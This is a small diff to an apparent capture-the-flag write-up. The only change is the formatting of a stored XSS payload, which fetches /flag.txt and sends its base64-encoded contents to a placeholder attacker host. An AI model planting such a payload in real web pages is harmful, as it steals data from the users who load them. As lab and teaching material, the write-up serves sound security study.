@@ -124,13 +124,13 @@ The next step was to craft a payload capable of retrieving the protected resourc
 
 To exploit the stored XSS, I crafted a payload to retrieve the protected resource:
 
-"<script>
-fetch('/flag.txt')
-  .then(response => response.text())
-  .then(data => {
-    fetch('http://<ATTACKER-IP>:443/?flag=' + btoa(data))
-  });
-</script>
+"<script> <br>
+fetch('/flag.txt') <br>
+  .then(response => response.text())  <br>
+  .then(data => {  <br>
+    fetch('http://<ATTACKER-IP>:443/?flag=' + btoa(data))  <br>
+  });  <br>
+</script>  <br>
 
 Explanation:
 
